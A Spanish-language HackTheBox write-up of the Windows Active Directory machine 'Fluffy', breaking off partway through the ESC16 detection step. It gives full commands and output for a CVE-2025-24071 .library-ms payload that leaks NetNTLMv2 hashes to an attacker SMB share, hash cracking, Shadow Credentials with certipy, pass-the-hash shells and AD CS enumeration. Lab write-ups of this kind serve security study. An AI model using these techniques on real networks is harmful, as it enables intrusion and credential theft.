---
title: Fluffy - Easy (HTB)
permalink: /Fluffy-HTB-Writeup/
tags:
  - Windows
  - Easy
  - SMB Enumeration
  - BloodHound
  - CVE-2025-24071
  - Spoofing
  - Hash Cracking
  - Shadow Credentials
  - PassTheHash
  - AD CS
  - ESC16
  - PassTheCert
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Fluffy - Easy (HTB)
seo_description: Explota CVE-2025-24071 y usa técnicas de explotación como Shadow Credentials y ESC16 en AD CS para vencer Fluffy.
excerpt: Explota CVE-2025-24071 y usa técnicas de explotación como Shadow Credentials y ESC16 en AD CS para vencer Fluffy.
header:
  overlay_image: /assets/images/headers/fluffy-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/fluffy-hackthebox.jpg
---


![image-center](/assets/images/posts/fluffy-hackthebox.png)
{: .align-center}

**Habilidades:** Domain Enumeration - `Bloodhound`, SMB Enumeration, Microsoft Windows File Explorer Spoofing Vulnerability (CVE-2025-24071), Hash Cracking, Shadow Credentials - `certipy`, PassTheHash, Abusing AD CS - `ESC16` Technique [Privilege Escalation]
{: .notice--primary}

# Introducción

Fluffy es una máquina Windows de dificultad `Easy` en HackTheBox que requiere vulnerar un entorno de Active Directory. Explotaremos CVE-2025-24071 a través de un archivo `.library-ms`, el cual mediante una posterior combinación de la técnica `Shadow Credentials`, obtendremos acceso inicial. Posteriormente abusaremos del servicio AD CS (Active Directory Certificate Services) a través de la técnica ECS16 para conseguir acceso privilegiado al dominio.
<br>
HackTheBox nos proporciona unas credenciales en el siguiente mensaje

> Machine Information
>
> As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman` / `J0elTHEM4n1990!`
{: .notice--info}
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.69 
PING 10.10.11.69 (10.10.11.69) 56(84) bytes of data.
64 bytes from 10.10.11.69: icmp_seq=1 ttl=127 time=136 ms

--- 10.10.11.69 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.281/136.281/136.281/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos realizando un escaneo de puertos, el cual se encargará de detectar todos los servicios accesibles mediante el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.69 -oG openPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-19 15:09 EDT
Nmap scan report for 10.10.11.69
Host is up (0.35s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49693/tcp open  unknown
49707/tcp open  unknown
49724/tcp open  unknown
49761/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 41.19 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Realizaremos un segundo escaneo exhaustivo con el propósito de identificar la versión de los servicios que se ejecutan en los puertos descubiertos

~~~ bash
nmap -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49693,49707,49724,49761 -sVC 10.10.11.69 -oN services 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-19 15:11 EDT
Nmap scan report for 10.10.11.69
Host is up (0.28s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-20 02:12:02Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-20T02:13:39+00:00; +6h59m56s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-20T02:13:41+00:00; +6h59m56s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-20T02:13:39+00:00; +6h59m56s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-09-20T02:13:41+00:00; +6h59m56s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
49761/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-20T02:12:59
|_  start_date: N/A
|_clock-skew: mean: 6h59m55s, deviation: 0s, median: 6h59m55s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.08 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos una gran cantidad de servicios abiertos (`dns`, `kerberos`, `ldap`, etc.), esto es un gran indicador de que estamos frente a un controlador de dominio de Active Directory.

Vemos el nombre de la máquina y del dominio, agregaremos esta información a nuestro archivo `/etc/hosts` para poder aplicar una resolución DNS correctamente

~~~ bash
echo '10.10.11.69 fluffy.htb DC01.fluffy.htb' | sudo tee -a /etc/hosts

10.10.11.69 fluffy.htb DC01.fluffy.htb
~~~


## Domain Enumeration - `Bloodhound`

Con credenciales válidas, podremos recolectar información de toda la estructura del dominio `flufffy.htb` (si contamos con los permisos necesarios), y cargar esta información en `Bloodhound` para analizar relaciones entre usuarios, grupos, etc.

~~~ bash
ntpdate DC01.fluffy.htb && bloodhound-python -d fluffy.htb -ns 10.10.11.69 --zip -c All -u j.fleischman -p 'J0elTHEM4n1990!'

2025-09-19 22:20:12.851500 (-0400) -0.103904 +/- 0.126649 DC01.fluffy.htb 10.10.11.69 s1 no-leap
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 42S
INFO: Compressing output into 20250919222015_bloodhound.zip
~~~

> El comando `ntpdate` sincroniza nuestro reloj con el del controlador de dominio (necesario cuando se emplea autenticación `kerberos`)
{: .notice--info}

Subiremos el archivo `.zip` a `Bloodhound` para cargar toda la información, posteriormente podemos comenzar a buscar usuarios y las relaciones que éstos tienen con otros objetos del dominio

![image-center](/assets/images/posts/fluffy-bloodhound.png)
{: .align-center}

### Users

Opcionalmente, con herramientas como `rpcclient` podemos consultar información básica del dominio, como enumerar usuarios, grupos, etc.

El siguiente comando nos devuelve un listado de los usuarios válidos a nivel de dominio, podemos guardar esta lista en un archivo redirigiendo la salida con `>` (en este caso, a `users.txt`)

~~~ bash
rpcclient DC01.fluffy.htb -U 'j.fleischman%J0elTHEM4n1990!' -c enumdomusers | cut -d ' ' -f1-1 | grep -oP '\[.*?\]' | tr -d '[]' > users.txt

Administrator
Guest
krbtgt
ca_svc
ldap_svc
p.agila
winrm_svc
j.coffey
j.fleischman
~~~


## SMB Enumeration 

Como es común en enumeración a entornos Windows, debemos validar si podemos enumerar recursos de red a nivel de SMB. Como disponemos de credenciales válidas, omitiremos el iniciar una sesión anónima (sin credenciales)

~~~ bash
smbmap -H DC01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'

[+] IP: DC01.fluffy.htb:445	Name: unknown
      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ, WRITE	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
~~~

Fuera de los recursos habituales como `C$, SYSVOL, NETLOGON`, vemos un recurso llamado `IT`, al que podemos acceder con permisos de lectura y escritura.

Podemos conectarnos interactivamente con la herramienta `smbclient`

~~~ bash
smbclient //DC01.fluffy.htb/IT -U 'j.fleischman%J0elTHEM4n1990!' 

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Sep 20 15:28:24 2025
  ..                                  D        0  Sat Sep 20 15:28:24 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A      300  Sat Sep 20 11:41:17 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A      300  Sat Sep 20 11:41:20 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
  VTRDIBHUCM                          D        0  Sat Sep 20 15:28:24 2025

		5842943 blocks of size 4096. 2219586 blocks available
~~~

Vemos algunos archivos `.zip`, un archivo `PDF` y  `KeePass` en su versión `2.58`. Descargaremos el archivo `Upgrade_Notice.pdf`

~~~ bash
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (34.9 KiloBytes/sec) (average 34.9 KiloBytes/sec)
~~~

  El PDF que descargamos nos dice que varias vulnerabilidades de alto impacto fueron descubiertas y hace un llamado a los administradores a aplicar los parches de seguridad correspondientes

![image-center](/assets/images/posts/fluffy-pdf.png)
{: .align-center}

Más abajo veremos una tabla donde se muestran las vulnerabilidades recientemente descubiertas 

![image-center](/assets/images/posts/fluffy-pdf-2.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## Microsoft Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)

Esta vulnerabilidad afecta a múltiples versiones de Windows 10, 11, Server 2012, 2016, 2019 y 2022. Permite a un atacante capturar hashes `NetNTLMv2` cuando la víctima extrae archivos `.library-ms` especialmente diseñados.  

> Un archivo `.library-ms` en Windows es un archivo de metadatos en formato XML que describe una biblioteca de documentos.
{: .notice--info}

### Understanding Vulnerability

La vulnerabilidad reside en la forma en la que Windows File Explorer maneja los archivos `.library-ms` dentro de archivos comprimidos.

Cuando un archivo `.library-ms` que contiene una ruta SMB es comprimido dentro de un archivo `.zip`/`.rar` y posteriormente se extrae, el Explorador de Windows analiza automáticamente el contenido del archivo comprimido a través de un mecanismo integrado de indexación. A continuación se muestra cómo luce un archivo `.library-ms` malicioso

~~~ xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.X.X\evil</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
~~~

La extracción y procesamiento del archivo comprimido (que contiene el archivo `.library-ms` anterior) resulta en tráfico hacia el recurso SMB que especificamos en el atributo `<url>`

### Exploiting

Existen diversas pruebas de concepto disponibles en [`Github`](https://github.com/ThemeHackers/CVE-2025-24071) que nos permiten crear tanto el archivo `.library-ms` como un archivo comprimido `.zip` o `.rar`, el cual es necesario ya que se necesita que la víctima extraiga el contenido del comprimido para iniciar tráfico SMB hacia nosotros.

A continuación iniciaremos un servidor `smb`, el cual se encargará de gestionar la autenticación NTLM

> La autenticación NTLM (`NT LAN Manager`) es un protocolo de Microsoft que utiliza un mecanismo de desafío/respuesta para **autenticar usuarios en redes Windows**, generando un hash a partir de la contraseña del usuario y un número aleatorio (desafío) para verificar la identidad en el servidor
{: .notice--info}

~~~ bash
impacket-smbserver shared $(pwd) -smb2support

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
05/24/2025 11:12:36 PM: INFO: Config file parsed
~~~

Ejecutaremos el exploit, el cual creará dos archivos, un comprimido (`exploit.zip`) y el archivo `.library-ms` malicioso

~~~ bash
git clone https://github.com/ThemeHackers/CVE-2025-24071
cd CVE-2025-24071
pip install -r requirements.txt

# Consturimos los archivos
python3 exploit.py -i 10.10.16.89 -f poc
~~~

Recordemos que tenemos permisos de escritura sobre la ruta`IT`, además de que existen archivos `.zip` que claramente fueron extraídos, por lo que es probable que cuando subamos el comprimido aquí, alguien extraiga nuestro archivo `exploit.zip`

~~~ bash
smb: \> dir
  .                                   D        0  Sat Sep 20 19:39:57 2025
  ..                                  D        0  Sat Sep 20 19:39:57 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

		5842943 blocks of size 4096. 1956804 blocks available
~~~

Nos conectaremos a la ruta `IT` para subir el comprimido con el comando `put`

~~~ bash
smbclient //DC01.fluffy.htb/IT -U 'j.fleischman%J0elTHEM4n1990!'

smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.3 kb/s) (average 0.3 kb/s)
~~~

Cuando la víctima extraiga el archivo `exploit.zip`, se iniciará un proceso de autenticación NTLM hacia nuestro servidor SMB, capturando el hash `NetNTLMv2` que corresponde al usuario `p.agila`

~~~ bash
05/24/2025 11:13:32 PM: INFO: Incoming connection (10.10.11.69,56980)
05/24/2025 11:13:32 PM: INFO: AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
05/24/2025 11:13:32 PM: INFO: User DC01\p.agila authenticated successfully
05/24/2025 11:13:32 PM: INFO: p.agila::FLUFFY:aaaaaaaaaaaaaaaa:346ed0d6fb9525fc84beea7f2c9f97a6:010100000000000080f387364d2adc01ec7dc142c74320eb00000000010010004d0046007200520055006c004c006300030010004d0046007200520055006c004c006300020010004b007000420047006d00750069007600040010004b007000420047006d007500690076000700080080f387364d2adc01060004000200000008003000300000000000000001000000002000000783b7caacb5a2c6da5a06bc37b4432a0528d9d517548c083683bf4321cf45bd0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00380039000000000000000000
~~~


## Hash Cracking

Cuando monitoreamos tráfico NTLM  en una red Windows y capturamos un hash `NetNTLMv2`, no podemos utilizar este hash directamente a modo de autenticación, pero podemos intentar descifrarlo mediante fuerza bruta, y así obtendríamos la contraseña en texto claro. 

Guardaremos el hash capturado en un archivo para intentar crackearlo con herramientas como `john` o `hashcat`

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2_hash.txt              
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:02 DONE (2025-05-24 23:14) 0.4716g/s 2131Kp/s 2131Kc/s 2131KC/s proquis..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
~~~

Obtuvimos la contarseña para el usuario `p.agila`, podemos validar sus credenciales rápidamente con herramientas como `netexec`

~~~ bash
nxc smb 10.10.11.69 -u p.agila -p 'prometheusx-303'  
       
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303
~~~


## Lateral Movement Path

Analizando la información recolectada en `Bloodhound`, enumeraremos buscando vías potenciales de movimiento lateral dentro del dominio. 

El usuario `p.agila` posee derechos `GenericAll` sobre el grupo `Service Accounts`

![image-center](/assets/images/posts/fluffy-bloodhound-2.png)
{: .align-center}

El grupo `Service Accounts` posee tres miembros, los cuales son cuentas de servicio asociadas al dominio, y el grupo posee derechos `GenericWrite` sobre ellas. Esto le permite a un miembro de este grupo modificar cualquier atributo no protegido

![image-center](/assets/images/posts/fluffy-bloodhound-3.png)
{: .align-center}

Para conectarnos de forma interactiva a un equipo Windows, existe el protocolo WinRM, mediante el cual podemos ejecutar comandos remotamente a través de una consola de `powershell`.

> WinRM (Windows Remote Management) es una implementación de Microsoft del protocolo WS-Management (un estándar basado en SOAP) que permite la **administración y automatización remota** de sistemas Windows.
{: .notice--info}

Lógicamente, la cuenta `winrm_svc` hace alusión a este protocolo, además de que forma parte del grupo `Remote Management Users`

 > El grupo "Remote Management Users" es un grupo de seguridad local en Windows que otorga a sus miembros la capacidad de **administrar remotamente** un equipo o servidor mediante el servicio WinRM (Administración Remota de Windows).
{: .notice--info}

![image-center](/assets/images/posts/fluffy-bloodhound-4.png)
{: .align-center}

En cuanto a las otras cuentas, `ca_svc` parece ser una cuenta para gestionar certificados a través del servicio AD CS, debido a que forma parte del grupo [`Cert Publishers`](https://legacy.thehacker.recipes/a-d/movement/ad-cs#cert-publishers).

> AD CS, o Servicios de certificados de Active Directory, es una función de servidor de Windows que permite a las organizaciones crear una infraestructura de clave pública (PKI) para emitir, gestionar y revocar certificados digitales.
{: .notice--info}

![image-center](/assets/images/posts/fluffy-bloodhound-5.png)
{: .align-center}


## Shadow Credentials

> Esta técnica contempla modificar el atributo `msDS-KeyCredentialLink`, añadiendo credenciales alternativas en forma de certificados, permitiendo autenticarnos como el usuario víctima sin conocer su contraseña. 
{: .notice--info}

El derecho `GenericAll` otorga control total sobre el usuario objetivo, pudiendo modificar cualquier atributo de esta cuenta. 

En este caso necesitaremos formar parte del grupo `Service Accounts` para poder realizar el ataque, debido a que solo los miembros del grupo `Service Accounts` tienen control sobre atributos de otras cuentas de ese grupo

~~~ bash
net rpc group addmem 'SERVICE ACCOUNTS' 'p.agila' -U 'fluffy.htb/p.agila%prometheusx-303' -S DC01.fluffy.htb
~~~

A modo de verificar que hemos añadido al usuario `p.agila` correctamente al grupo `Service Accounts`, verificaremos los miembros del grupo

~~~ bash
net rpc group members 'SERVICE ACCOUNTS' -U 'fluffy.htb/p.agila%prometheusx-303' -S DC01.fluffy.htb  

FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
~~~

Podemos utilizar la herramienta `certipy` que contiene un modo que automatiza el proceso de añadir `msDS-KeyCredentialLink` al usuario víctima y la autenticación, de forma que obtenemos directamente credenciales en caché y el hash NT de la cuenta `winrm_svc`

~~~ bash
certipy shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc -dc-ip 10.10.11.69

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0dd3e542-ed13-3915-9d75-e6c61baa0070'
[*] Adding Key Credential with device ID '0dd3e542-ed13-3915-9d75-e6c61baa0070' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '0dd3e542-ed13-3915-9d75-e6c61baa0070' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
~~~

Además, podremos obtener el hash NT de la cuenta `ca_svc` y `ldap_svc

~~~ bash
certipy shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account ca_svc -dc-ip 10.10.11.69 

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b675910c-36cd-41c7-f2b7-16072b190199'
[*] Adding Key Credential with device ID 'b675910c-36cd-41c7-f2b7-16072b190199' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'b675910c-36cd-41c7-f2b7-16072b190199' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
~~~


## Shell as `winrm_svc`

Con el hash NT de la cuenta `winrm_svc`, podemos hacer PassTheHash para conectarnos remotamente al Controlador de Dominio utilizando el protocolo `WinRM`

~~~ bash
evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
fluffy\winrm_svc
~~~

En este punto ya podemos ver la flag del usuario sin privilegios

~~~ bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> type ..\Desktop\user.txt 
edb...
~~~
<br>
# Escalada de Privilegios
---
## Abusing AD CS - `ESC16` Technique

ESC16 es una técnica de post-explotación que abusa del servicio AD CS (`Active Directory Certificate Services`), permitiendo eludir la validación de certificados y escalar privilegios a través de plantillas de certificados con configuraciones inseguras.

### Understanding Vulnerability

ESC16 aprovecha una configuración en la que la `CA` globalmente deshabilita la inclusión de `szOID_NTDS_CA_SECURITY_EXT` (su valor OID es `1.3.6.1.4.1.311.25.2`) en todos los certificados que emite. 

> CA son las siglas de Autoridad de Certificación (Certification Authority), una entidad de confianza que emite y administra certificados digitales para usuarios, equipos y servicios dentro de un dominio de Active Directory, validando sus identidades y permitiendo comunicaciones seguras.
{: .notice--info}

Esta extensión SID es vital para un "mapeo estricto de certificados" (`Strong Certificate Mapping`) en AD CS, debido a que permite al Controlador de Dominio asignar un certificado al SID de la cuenta de un usuario para su autenticación. 

El problema se debe a que cuando se añade el OID de esta extensión en el valor `DisableExtensionList` de la siguiente clave de registro 

~~~ bash
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>
~~~

Con esta configuración, todos los certificados emitidos por esta CA carecerán de esta extensión de seguridad SID.

Además, la viabilidad de explotar ESC16, depende de la configuración del registro `StrongCertificateBindingEnforcement` en el DC.

> La configuración del registro `StrongCertificateBindingEnforcement` rige el grado de rigor con el que un controlador de dominio valida la vinculación entre un certificado y su objeto de Active Directory asociado durante la autenticación. 
{: .notice--warning} 

Este mecanismo es crucial para mitigar los ataques de suplantación de identidad basados en certificados, su valor se encuentra bajo la siguiente clave de registro

~~~ bash
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
	StrongCertificateBindingEnforcement
~~~

- `0` (`Disabled`): No se aplica el mapeo estricto.
- `1` (`Compatibility Mode`): Se prefiere un mapeo estricto, pero se permite volver a un mapeo heredado.
- `2` (`Full Enforcement`): Sólo se aceptan certificados con mapeo estricto. Se rechazan las asignaciones heredadas.

De este modo (si `StrongCertificateBindingEnforcement` es `0` o `1`), podemos manipular el UPN de una cuenta (por ejemplo, con `GenericWrite`) y esa cuenta puede inscribirse a cualquier certificado de autenticación de cliente, podemos:

- Cambiar el UPN de una cuenta que controlamos para que coincida con el UPN de la cuenta privilegiada objetivo.
- Solicitar un certificado (que carecerá de la extensión de seguridad SID).
- Revertir el cambio de UPN para evitar errores en la autenticación.
- Utilizar el certificado para impersonar al usuario objetivo, empleando autenticación basada en certificados.

### Detection

Comenzaremos por enumerar plantillas de certificados en busca de vulnerabilidades asociadas al servicio AD CS

> Para encontrar ESC16, debes tener instalada la versión `>= 5.0.2` de `certipy`
{: .notice--danger}

~~~ bash
certipy find -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -stdout

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'

[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
~~~

Alternativamente, desde la shell con la cuenta `winrm_svc`, podemos consultar el valor de `DisableExtensionList`, donde deberíamos ver el OID de la extensión `szOID_NTDS_CA_SECURITY_EXT` añadido

~~~ powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fluffy-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy /v DisableExtensionList

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fluffy-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy
